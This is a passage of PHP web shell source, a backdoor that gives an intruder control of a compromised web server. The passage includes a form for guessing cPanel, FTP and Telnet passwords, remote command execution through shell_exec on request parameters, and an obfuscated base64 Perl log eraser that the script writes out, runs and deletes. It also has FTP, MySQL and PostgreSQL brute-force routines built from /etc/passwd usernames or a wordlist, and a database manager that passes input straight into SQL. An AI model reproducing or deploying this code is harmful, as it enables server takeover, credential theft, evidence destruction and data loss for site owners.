								if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
									continue;
								echo $matches;
							}
							fclose($file);
						}
					}
				}

				 ?></textarea></td><td align=center><textarea name=password rows=25 cols=22 class=box></textarea></td>
			</tr>
			<tr>
				<td align=center colspan=2>Guess options : <label><input name="cracktype" type="radio" value="cpanel" checked> Cpanel(2082)</label><label><input name="cracktype" type="radio" value="ftp"> Ftp(21)</label><label><input name="cracktype" type="radio" value="telnet"> Telnet(23)</label></td>
			</tr>
			<tr>
				<td align=center colspan=2>Timeout delay : <input type="text" name="delay" value=5 class=sbox></td>
			</tr>
			<tr>
				<td align=center colspan=2><input type="submit" name="cpanelattack" value="   Go    " class=but></td>
			</tr>
		</table>
		</form>
		</center>
		<?php
}
else if(isset($_REQUEST['malattack']))
{
	?><input type="hidden" id="malpath" value="<?php echo $_GET["dir"]; ?>">
	<center><table><tr><td><a href=# onClick="getdata('malware')"><font class=txt size="4">| Malware Attack |</font></a></td>
	<td><a href=# onClick="getdata('codeinsert')"><font class=txt size="4">| Insert Own Code |</font></a></td></tr></table></center><br>
	<div id="showdata"></div>
	<?php
}
else if(isset($_GET["com"]))
{
	echo "<br>";
	ob_start();
	eval("phpinfo();");
	$b = ob_get_contents();
	ob_end_clean();
	$a = strpos($b,"<body>")+6; // yeah baby,, your body is wonderland ;-)
	$z = strpos($b,"</body>");
	$s_result = "<div class='myphp'>".substr($b,$a,$z-$a)."</div>";
	echo $s_result;
}
else if(isset($_GET['execute']))
{
	$comm = $_GET['execute'];
	chdir($_GET['executepath']);
	$check = shell_exec($comm);
	
	echo "<center><textarea id=showexecute cols=120 rows=20 class=box>" . $check . "</textarea></center>";
		
	?>
	<BR><BR><center><form onSubmit="executemyfn('<?php echo addslashes($_GET['executepath']); ?>',execute.value);return false;">
	<input type="text" class="box" name="execute">
	<input type="button" onClick="executemyfn('<?php echo addslashes($_GET['executepath']); ?>',execute.value)" value="Execute" class="but"></form></center>
	<?php
}
else if(isset($_GET['mycmd']))
{
	if($_GET['mycmd']=="logeraser")
	{
		$erase = gzinflate(base64_decode("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"));
		if(is_writable("."))
		{	
			if($openp = fopen(getcwd()."/logseraser.pl", 'w'))
			{
				fwrite($openp, $erase);
				fclose($openp);
				passthru("perl logseraser.pl linux");
				unlink("logseraser.pl");
				echo "<center><font color=#FFFFFF size=3>Logs Cleared</font></center>";
			}
		} else 
		{
			if($openp = fopen("/tmp/logseraser.pl", 'w'))
			{
				fwrite($openp, $erase)or die("Error");
				fclose($openp);
				$aidx = passthru("perl logseraser.pl linux");
				unlink("logseraser.pl");
				echo "<center><font color=#FFFFFF size=3>Logs Cleared</font></center>";
			}
		}
	}
	else
	{
		$check = shell_exec($_GET['mycmd']);
		echo "<center><textarea cols=120 rows=20 class=box>" . $check . "</textarea></center>";
	}
}
else if(isset($_GET['prototype'])) 
{
	echo '<h1>Results</h1><div><span>Type:</span> '.htmlspecialchars($_GET['prototype']).' <span><br>Server:</span> '.htmlspecialchars($_GET['serverport']).'<br>';
	if( $_GET['prototype'] == 'ftp' ) 
	{
		function BruteFun($ip,$port,$login,$pass) 
		{
			$fp = @ftp_connect($ip, $port?$port:21);
			if(!$fp) return false;
			$res = @ftp_login($fp, $login, $pass);
			@ftp_close($fp);
			return $res;
		}
	}
	elseif( $_GET['prototype'] == 'mysql' )
	{
		function BruteFun($ip,$port,$login,$pass) 
		{
			$res = @mysql_connect($ip.':'.$port?$port:3306, $login, $pass);
			@mysql_close($res);
			return $res;
		}
	}
	elseif( $_GET['prototype'] == 'pgsql' )
	{
		function BruteFun($ip,$port,$login,$pass)
		{
			$str = "host='".$ip."' port='".$port."' user='".$login."' password='".$pass."' dbname=postgres";
			$res = @pg_connect($str);
			@pg_close($res);
			return $res;
		}
	}
	
	$success = 0;
	$attempts = 0;
	$server = explode(":", $_GET['server']);
	if($_GET['type'] == 1) 
	{
		$temp = @file('/etc/passwd');
		if( is_array($temp))
			foreach($temp as $line) 
			{
				$line = explode(":", $line);
				++$attempts;
				if(BruteFun(@$server[0],@$server[1], $line[0], $line[0]) ) 
				{
					$success++;
					echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($line[0]).'<br>';
				}
				if(@$_GET['reverse']) 
				{
					$tmp = "";
					for($i=strlen($line[0])-1; $i>=0; --$i)
						$tmp .= $line[0][$i];
					++$attempts;
					if(BruteFun(@$server[0],@$server[1], $line[0], $tmp) ) 
					{
						$success++;
						echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($tmp);
					}
				}
			}
	}
	elseif($_GET['type'] == 2) 
	{
		$temp = @file($_GET['dict']);
		if( is_array($temp) )
			foreach($temp as $line) 
			{
				$line = trim($line);
				++$attempts;
				if(BruteFun($server[0],@$server[1], $_GET['login'], $line) ) 
				{
					$success++;
					echo '<b>'.htmlspecialchars($_GET['login']).'</b>:'.htmlspecialchars($line).'<br>';
				}
			}
	}
	echo "<span>Attempts:</span> <font class=txt>$attempts</font> <span>Success:</span> <font class=txt>$success</font></div>";
}
// Execute Query
else if(isset($_GET["executeit"]))
{
	if(isset($_GET['username'])  && isset($_GET['server']))
	{ 
		$dbserver = $_GET['server'];
		$dbuser = $_GET['username'];
		$dbpass = $_GET['password'];
		if(mysql_connect($dbserver,$dbuser,$dbpass))
		{
			setcookie("dbserver", $dbserver);			
			setcookie("dbuser", $dbuser);
			setcookie("dbpass", $dbpass);
			
			listdatabase();
		}
		else					
			echo "cannotconnect";
	}
}
else if(isset($_GET['action']) && isset($_GET['dbname']))


	{
		if($_GET['action'] == "createDB")
		{
			$dbname = $_GET['dbname'];
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$mysqlHandle = mysql_connect($dbserver, $dbuser, $dbpass);
			mysql_query("create database $dbname",$mysqlHandle);
			listdatabase();
		}
		if($_GET['action'] == 'dropDB')
		{
			$dbname = $_GET['dbname'];
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$mysqlHandle = mysql_connect($dbserver, $dbuser, $dbpass);
			mysql_query("drop database $dbname",$mysqlHandle);
			mysql_close($mysqlHandle);
			listdatabase();
		}

		if($_GET['action'] == 'listTables')
		{
			listtable();
		}
		
		// Create Tables
		if($_GET['action'] == "createtable")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			mysql_query("CREATE TABLE $tablename ( no INT )");
			listtable();
		}
		
		// Drop Tables
		if($_GET['action'] == "dropTable")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			mysql_query("drop table $tablename");
			listtable();
		}
		
		// Empty Tables
		if($_GET['action'] == "empty")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			mysql_query("delete from $tablename");
			listtable();
		}
		
		// Empty Tables
		if($_GET['action'] == "dropField")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$fieldname = $_GET['fieldname'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			$queryStr = "ALTER TABLE $tablename DROP COLUMN $fieldname";
			mysql_select_db( $dbname, $mysqlHandle );
			mysql_query( $queryStr , $mysqlHandle );
			listtable();
		}
		
		if($_GET['action'] == 'viewdb')
		{
			listdatabase();	
		}
		
		// View Table Schema
		if($_GET['action'] == "viewSchema")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			echo "<br><div><font color=white size=3>[ $dbname ]</font> - <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('viewdb')\"> <font size=3>Database List</font> </a> <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('listTables','$dbname','$tablename')\"> <font size=3>Table List</font> </a> &nbsp; <a href=$self?logoutdb> <font  size=3>[ Log Out ]</font> </a></div>";	
			$pResult = mysql_query( "SHOW fields FROM $tablename" );
			$num = mysql_num_rows( $pResult );
			echo "<br><br><table align=center cellspacing=4 style='width:80%;' border=1>";
			echo "<th>Field</th><th>Type</th><th>Null</th><th>Key</th></th>";
			for( $i = 0; $i < $num; $i++ ) 
			{
				$field = mysql_fetch_array( $pResult );
				echo "<tr>\n";
				echo "<td>".$field["Field"]."</td>\n";
				echo "<td>".$field["Type"]."</td>\n";
				echo "<td>".$field["Null"]."</td>\n";
				echo "<td>".$field["Key"]."</td>\n";
				echo "<td>".$field["Default"]."</td>\n";
				echo "<td>".$field["Extra"]."</td>\n";
				$fieldname = $field["Field"];
				echo "<td><a href=# onClick=\"viewtables('dropField','$dbname','$tablename','','','','$fieldname')\">Drop</a></td>\n";
				echo "</tr>\n";
			}
			echo "</table>";
			echo "<div><font color=white size=3>[ $dbname ]</font> - <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('viewdb')\"> <font size=3>Database List</font> </a> <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('listTables','$dbname','$tablename')\"> <font size=3>Table List</font> </a> &nbsp; <a href=$self?logoutdb> <font  size=3>[ Log Out ]</font> </a></div>";
		}
		
		// Execute Query
		if($_GET['action'] == "executequery")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			$result = mysql_query($_GET['executemyquery']); 
			
			//  results 
			echo "<html>\r\n". strtoupper($_GET['executemyquery']) . "<br>\r\n<table border =\"1\">\r\n"; 
			 
			$count = 0; 
			while ($row = mysql_fetch_assoc($result)) 
			{ 
			   echo "<tr>\r\n"; 
			 
			   if ($count==0) // list column names 
			   { 
				  echo "<tr>\r\n"; 
				  while($key = key($row)) 
				  { 
					 echo "<td><b>" . $key . "</b></td>\r\n"; 
					 next($row); 
				  } 
				  echo "</tr>\r\n"; 
			   } 
			 
			   foreach($row as $r) // list content of column names 
			   { 
				  if ($r=='') $r = '<font >NULL</font>'; 
				  echo "<td><font class=txt>" . $r . "</font></td>\r\n"; 
			   } 
			   echo "</tr>\r\n"; 
			   $count++; 
			} 
			echo "</table>\n\r<font class=txt size=3>" . $count . " rows returned.</font>\r\n</html>"; 
			echo "<div><font color=white size=3>[ $dbname ]</font> - <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('viewdb')\"> <font size=3>Database List</font> </a> <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('listTables','$dbname','$tablename')\"> <font size=3>Table List</font> </a> &nbsp; <a href=$self?logoutdb> <font  size=3>[ Log Out ]</font> </a></div>";
		}
		
		// View Table Data
		if($_GET['action'] == "viewdata")
		{
			global $queryStr, $action, $mysqlHandle, $dbname, $tablename, $PHP_SELF, $errMsg, $page, $rowperpage, $orderby, $data;
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			echo "<br><div><font color=white size=3>[ $dbname ]</font> - <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('viewdb')\"> <font size=3>Database List</font> </a> <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('listTables','$dbname','$tablename')\"> <font size=3>Table List</font> </a> &nbsp; <a href=$self?logoutdb> <font  size=3>[ Log Out ]</font> </a></div>";	
			?>
			<br><br>
			<form>
			<table>
				<tr>
					<td><textarea cols="60" rows="7" name="executemyquery" class="box">Execute Query..</textarea></td>
				</tr>
				<tr>
					<td><input type="button" onClick="viewtables('executequery','<?php echo $_GET['dbname'];?>','<?php echo $_GET['tablename']; ?>','','',executemyquery.value)" value="Execute" class="but"></td>
				</tr>
			</table>
			</form>
			<?php 
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			
			$sql = mysql_query("SELECT `COLUMN_NAME` FROM `information_schema`.`COLUMNS` WHERE (`TABLE_SCHEMA` = '$dbname')  AND (`TABLE_NAME` = '$tablename')  AND (`COLUMN_KEY` = 'PRI');");
			$row = mysql_fetch_array($sql);
			$rowid = $row['COLUMN_NAME'];
			
			echo "<br><font size=4 color =lime>Data in Table</font><br>";
			if( $tablename != "" )
				echo "<font size=3 class=txt>$dbname &gt; $tablename</font><br>";
			else
				echo "<font size=3 class=txt>$dbname</font><br>";
			
			$queryStr = "";
			$pag = 0;
			$queryStr = stripslashes( $queryStr );
			if( $queryStr == "" ) 
			{
				if(isset($_REQUEST['page']))
				{
					$res = mysql_query("select * from $tablename");
					$getres = mysql_num_rows($res);
					$coun = ceil($getres/30);
					if($_REQUEST['page'] != 1)

						$pag = $_REQUEST['page'] * 30;
					else
						$pag = $_REQUEST['page'] * 30;
					
					$queryStr = "SELECT * FROM $tablename LIMIT $pag,30";
					$sql = mysql_query("SELECT $rowid FROM $tablename ORDER BY $rowid LIMIT $pag,30");
					$arrcount = 1;
					$arrdata[$arrcount] = 0;
					while($row = mysql_fetch_array($sql))
					{
						$arrdata[$arrcount] = $row[$rowid];
						$arrcount++;
					}
				}
				else
				{
					$queryStr = "SELECT * FROM $tablename LIMIT 0,30";
					$sql = mysql_query("SELECT $rowid FROM $tablename ORDER BY $rowid LIMIT 0,30");
					$arrcount = 1;
					$arrdata[$arrcount] = 0;
					while($row = mysql_fetch_array($sql))
					{
						$arrdata[$arrcount] = $row[$rowid];
						$arrcount++;
					}
				}
				if( $orderby != "" )
					$queryStr .= " ORDER BY $orderby";
				echo "<a href=# onClick=\"viewtables('viewSchema','$dbname','$tablename')\"><font size=3>Schema</font></a>\n";
			}
		

			$pResult = mysql_query($queryStr );
			$fieldt = mysql_fetch_field($pResult);
			$tablename = $fieldt->table;
			$errMsg = mysql_error();
		
			$GLOBALS[queryStr] = $queryStr;
		
			if( $pResult == false ) 
			{
				echoQueryResult();
				return;
			}
			if( $pResult == 1 ) 
			{
				$errMsg = "Success";
				echoQueryResult();
				return;
			}
		
			echo "<hr color='#1B1B1B'>\n";
		
			$row = mysql_num_rows( $pResult );
			$col = mysql_num_fields( $pResult );
		
			if( $row == 0 ) 
			{
				echo "<font  size=3>No Data Exist!</font>";
				return;
			}
		
			if( $rowperpage == "" ) $rowperpage = 30;
			if( $page == "" ) $page = 0;
			else $page--;
			mysql_data_seek( $pResult, $page * $rowperpage );
		
			echo "<table cellspacing=1 cellpadding=5 border=1 align=center>\n";
			echo "<tr>\n";
			for( $i = 0; $i < $col; $i++ ) 
			{
				$field = mysql_fetch_field( $pResult, $i );
				echo "<th>";
				if($action == "viewdata")
					echo "<a href='$PHP_SELF?action=viewdata&dbname=$dbname&tablename=$tablename&orderby=".$field->name."'>".$field->name."</a>\n";
				else
					echo $field->name."\n";
				echo "</th>\n";
			}
			echo "<th colspan=2>Action</th>\n";
			echo "</tr>\n";
			$num=1;
			
			
			$acount = 1;
						
			for( $i = 0; $i < $rowperpage; $i++ ) 
			{
				$rowArray = mysql_fetch_row( $pResult );
				if( $rowArray == false ) break;
				echo "<tr>\n";
				$key = "";
				for( $j = 0; $j < $col; $j++ )
				 {
					$data = $rowArray[$j];
		
					$field = mysql_fetch_field( $pResult, $j );
					if( $field->primary_key == 1 )
						$key .= "&" . $field->name . "=" . $data;
		
					if( strlen( $data ) > 30 )
						$data = substr( $data, 0, 30 ) . "...";
					$data = htmlspecialchars( $data );
					echo "<td>\n";
					echo "<font class=txt>$data</font>\n";
					echo "</td>\n";
				}
			
				if(!is_numeric($arrdata[$acount]))
				echo "<td colspan=2>No Key</td>\n";
				else 
				{
					echo "<td><a href=# onClick=\"viewtables('editData','$dbname','$tablename','$rowid','$arrdata[$acount]')\">Edit</a></td>\n";
					echo "<td><a href=# onClick=\"viewtables('deleteData','$dbname','$tablename','$rowid','$arrdata[$acount]')\">Delete</a></td>\n";
					$acount++;
				}
			}
			echo "</tr>\n";
		
		
			echo "</table>";
			if($arrcount > 30)
			{
				$res = mysql_query("select * from $tablename");
				$getres = mysql_num_rows($res);
				$coun = ceil($getres/30);
				echo "<form action=$self><input type=hidden value=viewdata name=action><input type=hidden name=tablename value=$tablename><input type=hidden value=$dbname name=dbname><select style='width: 95px;' name=page class=sbox>";
				for($i=0;$i<$coun;$i++)
					echo "<option value=$i>$i</option>";
				
				echo "</select> <input type=button onClick=\"viewtables('viewdata','$dbname','$tablename','','','','',page.value)\" value=Go class=but></form>";
				echo "<br><div><font color=white size=3>[ $dbname ]</font> - <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('viewdb')\"> <font size=3>Database List</font> </a> <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('listTables','$dbname','$tablename')\"> <font size=3>Table List</font> </a> &nbsp; <a href=$self?logoutdb> <font  size=3>[ Log Out ]</font> </a></div>";	
			}
		}
		
		// Delete Table Data
		if($_GET['action'] == "deleteData")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			$sql = mysql_query("SELECT `COLUMN_NAME` FROM `information_schema`.`COLUMNS` WHERE (`TABLE_SCHEMA` = '$dbname')  AND (`TABLE_NAME` = '$tablename')  AND (`COLUMN_KEY` = 'PRI');");
			$row = mysql_fetch_array($sql);
			$row = $row['COLUMN_NAME'];
			$rowid = $_GET[$row];
			mysql_query("delete from $tablename where $row = '$rowid'");
			listtable();
		}
		// Edit Table Data
		if($_GET['action'] == "editData")
		{
			global $queryStr, $action, $mysqlHandle, $dbname, $tablename, $PHP_SELF, $errMsg, $page, $rowperpage, $orderby, $data;
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			echo "<br><div><font color=white size=3>[ $dbname ]</font> - <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('viewdb')\"> <font size=3>Database List</font> </a> <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('listTables','$dbname','$tablename')\"> <font size=3>Table List</font> </a> &nbsp; <a href=$self?logoutdb> <font  size=3>[ Log Out ]</font> </a></div>";	
			?>
			<br><br>
			<form action="<?php echo $self; ?>" method="post">
			<?php 
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			
			$sql = mysql_query("SELECT `COLUMN_NAME` FROM `information_schema`.`COLUMNS` WHERE (`TABLE_SCHEMA` = '$dbname')  AND (`TABLE_NAME` = '$tablename')  AND (`COLUMN_KEY` = 'PRI');");
			$row = mysql_fetch_array($sql);
			$row = $row['COLUMN_NAME'];
			$rowid = $_GET[$row];
						
			$pResult = mysql_list_fields( $dbname, $tablename );
			$num = mysql_num_fields( $pResult );
	
			$key = "";
			for( $i = 0; $i < $num; $i++ ) 
			{
				$field = mysql_fetch_field( $pResult, $i );
				if( $field->primary_key == 1 )
					if( $field->numeric == 1 )
						$key .= $field->name . "=" . $GLOBALS[$field->name] . " AND ";
					else
						$key .= $field->name . "='" . $GLOBALS[$field->name] . "' AND ";
			}
			$key = substr( $key, 0, strlen($key)-4 );
	
			mysql_select_db( $dbname, $mysqlHandle );
			$pResult = mysql_query( $queryStr =  "SELECT * FROM $tablename WHERE $row = $rowid", $mysqlHandle );
			$data = mysql_fetch_array( $pResult );
		
			echo "<table cellspacing=1 cellpadding=2 border=1>\n";
			echo "<tr>\n";
			echo "<th>Name</th>\n";
			echo "<th>Type</th>\n";
			echo "<th>Function</th>\n";
			echo "<th>Data</th>\n";
			echo "</tr>\n";
		
			$pResult = mysql_db_query( $dbname, "SHOW fields FROM $tablename" );
			$num = mysql_num_rows( $pResult );
		
			$pResultLen = mysql_list_fields( $dbname, $tablename );
			$fundata1 = "'action','editsubmitData','dbname','".$dbname."','tablename','".$tablename."',";
			$fundata2 = "'action','insertdata','dbname','".$dbname."','tablename','".$tablename."',";
			for( $i = 0; $i < $num; $i++ ) 
			{
				$field = mysql_fetch_array( $pResult );
				$fieldname = $field["Field"];
				$fieldtype = $field["Type"];
				$len = mysql_field_len( $pResultLen, $i );
		
				echo "<tr>";
				echo "<td>$fieldname</td>";
				echo "<td>".$field["Type"]."</td>";
				echo "<td>\n";
				echo "<select name=${fieldname}_function class=sbox>\n";
				echo "<option>\n";
				echo "<option>ASCII\n";
				echo "<option>CHAR\n";
				echo "<option>SOUNDEX\n";
				echo "<option>CURDATE\n";
				echo "<option>CURTIME\n";
				echo "<option>FROM_DAYS\n";
				echo "<option>FROM_UNIXTIME\n";
				echo "<option>NOW\n";
				echo "<option>PASSWORD\n";
				echo "<option>PERIOD_ADD\n";
				echo "<option>PERIOD_DIFF\n";
				echo "<option>TO_DAYS\n";
				echo "<option>USER\n";
				echo "<option>WEEKDAY\n";
				echo "<option>RAND\n";
				echo "</select>\n";
				echo "</td>\n";
				$value = htmlspecialchars($data[$i]);
				$type = strtok( $fieldtype, " (,)\n" );
				if( $type == "enum" || $type == "set" ) 
				{
					echo "<td>\n";
					if( $type == "enum" )
						echo "<select name=$fieldname class=box>\n";
					else if( $type == "set" )
						echo "<select name=$fieldname size=4 class=box multiple>\n";
					while( $str = strtok( "'" ) ) 
					{
						if( $value == $str )
							echo "<option selected>$str\n";
						else
							echo "<option>$str\n";
						strtok( "'" );
					}
					echo "</select>\n";
					echo "</td>\n";
					} 
					else 
					{
						if( $len < 40 )
							echo "<td><input type=text size=40 maxlength=$len id=AK_$fieldname name=sql_$fieldname value=\"$value\" class=box></td>\n";
						else
							echo "<td><textarea cols=47 rows=3 maxlength=$len name=AK_$fieldname class=box>$value</textarea>\n";
					}
					$fundata1 .= "'AK_".$fieldname."',AK_".$fieldname.".value,";
					$fundata2 .= "'AK_".$fieldname."',AK_".$fieldname.".value,";
				echo "</tr>";
			}
			$fundata1=eregi_replace(',$', '', $fundata1); 
			$fundata2=eregi_replace(',$', '', $fundata2);
			
			echo "</table><p>\n";
			echo "<input type=button onClick=\"editdata($fundata1)\" value='Edit Data' class=but>\n";
			echo "<input type=button value='Insert' onClick=\"editdata($fundata2)\" class=but>\n";
			echo "</form>\n";
		}
	}
// Edit Submit Table Data
else if($_REQUEST['action'] == "editsubmitData")
{
	$dbserver = $_COOKIE["dbserver"];
	$dbuser = $_COOKIE["dbuser"];
	$dbpass = $_COOKIE["dbpass"];
	$dbname = $_POST['dbname'];
	$tablename = $_POST['tablename'];
	
	$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
	mysql_select_db($dbname);
	
	$sql = mysql_query("SELECT `COLUMN_NAME` FROM `information_schema`.`COLUMNS` WHERE (`TABLE_SCHEMA` = '$dbname')  AND (`TABLE_NAME` = '$tablename')  AND (`COLUMN_KEY` = 'PRI');");
	$row = mysql_fetch_array($sql);
	$row = $row['COLUMN_NAME'];
	$rowid = $_POST[$row];
		
	$pResult = mysql_db_query( $dbname, "SHOW fields FROM $tablename" );
	$num = mysql_num_rows( $pResult );
	
	$rowcount = $num;
				
	$pResultLen = mysql_list_fields( $dbname, $tablename );

	for( $i = 0; $i < $num; $i++ ) 
	{
		$field = mysql_fetch_array( $pResult );
		$fieldname = $field["Field"];
		$arrdata = $_REQUEST[$fieldname];
	
		$str .= " " . $fieldname . " = '" . $arrdata . "'";
		$rowcount--;
		if($rowcount != 0)
			$str .= ",";
	}
	
	$str = "update $tablename set" . $str . " where $row=$rowid";
	mysql_query($str);
	?><div id="showsql"></div><?php
}
// Insert Table Data
else if($_REQUEST['action'] == "insertdata")
{
	$dbserver = $_COOKIE["dbserver"];
	$dbuser = $_COOKIE["dbuser"];
	$dbpass = $_COOKIE["dbpass"];
	$dbname = $_POST['dbname'];
	$tablename = $_POST['tablename'];
	
	$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
	mysql_select_db($dbname);
			
